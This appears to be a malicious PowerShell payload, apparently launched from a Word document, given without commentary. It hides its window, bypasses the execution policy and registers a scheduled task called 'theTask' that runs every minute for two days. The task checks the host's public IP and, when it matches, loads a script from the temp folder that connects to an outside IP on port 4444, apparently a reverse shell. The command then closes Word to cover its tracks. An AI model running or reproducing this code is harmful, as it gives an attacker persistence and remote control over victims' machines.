powershell.exe -WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -NoLogo -c $repeat = (New-TimeSpan -Minutes 1); $span = (New-TimeSpan -Days 2);; powershell.exe -WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -NoLogo -c $Trigger= New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval $repeat -RepetitionDuration $span;; powershell.exe -WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -NoLogo -c $Action= New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -NoLogo -c if((Invoke-WebRequest -Uri https://ipecho.net/plain -UseBasicParsing).content.Trim() -eq "98.195.211.186"){Import-Module $env:TEMP\friend.ps1; friend -ip 206.189.226.184 -port 4444}' ;; powershell.exe -WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -NoLogo -c $principal = New-ScheduledTaskPrincipal -UserID $env:userName;; powershell.exe -WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -NoLogo -c Register-ScheduledTask -TaskName "theTask" -Trigger $Trigger -Action $Action -Principal $principal; Stop-Process -Name "WINWORD"
